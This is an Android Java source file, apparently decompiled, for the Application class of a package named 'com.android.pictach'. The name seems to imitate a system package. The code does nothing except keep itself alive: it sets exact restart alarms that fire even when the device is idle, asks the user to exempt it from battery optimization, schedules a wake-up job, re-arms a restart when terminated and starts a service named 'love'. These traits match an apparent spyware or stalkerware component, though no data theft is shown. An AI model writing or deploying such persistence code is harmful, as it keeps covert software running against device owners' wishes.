package com.android.pictach;

import android.app.AlarmManager;
import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.os.SystemClock;

public class App extends Application {

    private static final long RESTART_INTERVAL = 60000;
    private static final String TAG = "App";
    private static Context applicationContext;
    private PowerManager.WakeLock appWakeLock;
    private static final Handler handler = new Handler();

    public static Context getContext() {
        return applicationContext;
    }

    private void scheduleServiceRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            Intent intent = new Intent(this, MyReceiver.class);
            intent.setAction("RESTART_SERVICE");
            PendingIntent broadcast = PendingIntent.getBroadcast(this, 1001, intent, 201326592);
            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= 23) {
                    alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + RESTART_INTERVAL, broadcast);
                } else {
                    alarmManager.setExact(2, SystemClock.elapsedRealtime() + RESTART_INTERVAL, broadcast);
                }
            }
        } catch (Exception unused) {
        }
    }

    private void startService(Class<?> cls) {
        try {
            Intent intent = new Intent(this, cls);
            intent.putExtra("fromApp", true);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception unused) {
        }
    }

    private void requestBatteryOptimizationExemption() {
        try {
            Intent intent = new Intent(
                    "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                    Uri.parse("package:" + getPackageName())
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception unused) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        applicationContext = getApplicationContext();

        
        Utils.scheduleRestartAlarm(this, "Error", RESTART_INTERVAL);

        
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Utils.isBatteryOptimizationDisabled(this)) {
                handler.postDelayed(this::requestBatteryOptimizationExemption, 2000L);
            }
        }

        
        WackMeUpJob.scheduleJob(this);

        
        sendBroadcast(new Intent("RestartSensor"));
    }

    @Override
    public void onTerminate() {
        super.onTerminate();
        PowerManager.WakeLock wakeLock = this.appWakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                this.appWakeLock.release();
            } catch (Exception unused) {
            }
        }
        handler.removeCallbacksAndMessages(null);
        scheduleServiceRestart();
        sendBroadcast(new Intent("RestartSensor"));
    }

    public void startAllPersistentServices() {
        try {
            startService(love.class);
        } catch (Exception unused) {
        }
    }
}